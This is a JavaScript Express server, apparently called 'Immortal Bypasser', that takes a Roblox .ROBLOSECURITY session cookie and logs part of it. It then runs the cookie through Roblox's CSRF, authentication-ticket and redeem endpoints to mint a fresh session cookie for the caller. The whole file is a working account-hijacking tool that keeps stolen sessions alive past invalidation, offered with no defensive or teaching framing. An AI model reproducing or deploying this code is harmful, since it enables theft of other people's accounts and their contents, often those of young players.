const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ROOT
app.get('/', (req, res) => {
  res.send('Immortal Bypasser — LIVE');
});

// BYPASS
app.post('/api/bypass', async (req, res) => {
  const { cookie } = req.body;

  console.log('Received cookie length:', cookie?.length);
  console.log('Cookie starts with:', cookie?.substring(0, 50));

  if (!cookie) {
    return res.status(400).json({ error: 'No cookie sent' });
  }

  if (typeof cookie !== 'string') {
    return res.status(400).json({ error: 'Cookie must be string' });
  }

  if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
    return res.status(400).json({ error: 'Not a valid .ROBLOSECURITY' });
  }

  try {
    // 1. GET CSRF TOKEN
    const logoutRes = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { 
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      maxRedirects: 0,
      validateStatus: () => true
    });

    const csrf = logoutRes.headers['x-csrf-token'];
    if (!csrf) {
      console.log('No CSRF token. Status:', logoutRes.status);
      return res.status(400).json({ error: 'Cookie dead or 2FA' });
    }

    // 2. GET TICKET
    const ticketRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
      headers: {
        'x-csrf-token': csrf,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Referer': 'https://www.roblox.com/',
        'User-Agent': 'Mozilla/5.0'
      },
      validateStatus: status => status < 500
    });

    const ticket = ticketRes.headers['rbx-authentication-ticket'];
    if (!ticket) {
      console.log('No ticket. Response:', ticketRes.data);
      return res.status(400).json({ error: 'No ticket — account locked' });
    }

    // 3. REDEEM
    const redeemRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      authenticationTicket: ticket
    }, {
      headers: { 
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      }
    });

    const newCookie = redeemRes.headers['set-cookie']
      ?.find(c => c.includes('.ROBLOSECURITY'))
      ?.split(';')[0]
      ?.split('=')[1];

    if (!newCookie) {
      return res.status(500).json({ error: 'Failed to extract new cookie' });
    }

    console.log('SUCCESS — New cookie issued');
    res.json({ success: true, newCookie });

  } catch (error) {
    console.error('BYPASS ERROR:', error.message);
    const msg = error.response?.data || error.message;
    res.status(500).json({ error: msg });
  }
});

// LISTEN
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`SERVER LIVE ON PORT ${PORT}`);
});
